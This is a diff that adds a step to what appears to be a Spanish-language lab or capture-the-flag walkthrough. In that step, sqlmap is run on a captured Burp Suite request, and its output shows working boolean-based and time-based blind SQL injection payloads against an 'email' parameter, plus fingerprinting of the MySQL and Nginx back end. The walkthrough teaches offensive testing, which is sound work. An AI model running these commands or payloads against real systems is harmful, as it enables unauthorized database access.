@@ -91,5 +91,26 @@ Repetimos la operación, pero esta vez capturamos la petición mediante Burpsuit
 </p>
 
 Almacenamos el contenido de la petición en un fichero llamado request.txt. Posteriormente le pasaremos el fichero de la petición a SQLMap para intentar explotar la vulnerabilidad de Injección de SQL.
+```bash
+# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch
+<omitido>
+sqlmap identified the following injection point(s) with a total of 740 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8583=(SELECT (CASE WHEN (8583=8583) THEN 8583 ELSE (SELECT 7061 UNION SELECT 4296) END))-- NGWH
+
+    Type: time-based blind
+    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
+    Payload: _token=4u33vCKzMGK6WlzOlNaOKalDnmGti9bepeOdZuLp&email=test@test.es' AND 8195=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- eqGh
+---
+[09:57:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL > 5.0.12
+<omitido>
+```
+
 
 
